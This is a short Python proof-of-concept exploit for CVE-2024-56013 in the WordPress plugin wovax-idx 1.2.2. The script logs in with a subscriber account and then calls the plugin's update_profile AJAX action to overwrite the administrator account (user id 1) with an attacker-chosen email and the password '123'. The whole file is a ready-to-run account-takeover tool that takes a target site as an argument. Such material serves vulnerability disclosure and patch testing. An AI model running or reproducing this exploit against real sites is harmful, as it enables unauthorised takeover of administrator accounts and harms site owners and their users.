"""
CVE-2024-56013

Plugin Name: wovax-idx
Plugin URL: https://wordpress.org/plugins/wovax-idx/ (CLOSED)
Plugin Version: 1.2.2

by: ardias
"""
import requests
import argparse

session = requests.Session()

def login(domain, username, password):
    login_url = f'{domain}/wp-login.php'
    session.get(login_url)
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'testcookie': 1
    }
    r = session.post(login_url, data=data, allow_redirects=False)

    if r.status_code == 302:
        print(f"[+] Login Successful")
        return True

    print(r.text) 
    print(f"[-] Login Failed")
    return False

def change_profile(domain):
    url = f"{domain}/wp-admin/admin-ajax.php?action=update_profile"
    header = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
    data = {"id": "1", "firstname": "Admin", "lastname": "Pwned1", "email": "admin@pwned.com", "password": "123", "verify_password": "123", "phone": "1234567890", "username": "admin"}
    r = session.post(url, data=data, headers=header)
    if "Success!" in r.text:
        print("[+] Admin changed!")
        print("[i] admin:123")
    else:
        print("[-] Oops failed...")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Wovax IDX PoC Account Take over')
    parser.add_argument('-t', '--target', type=str, help='The target website (e.g., http://example.com)', required=True)
    parser.add_argument('-u', '--username', type=str, help='Subscriber username', required=True)
    parser.add_argument('-p', '--password', type=str, help='Subscriber password', required=True)

    args = parser.parse_args()

    if __name__ == "__main__":
        if login(args.target, args.username, args.password):
            change_profile(args.target)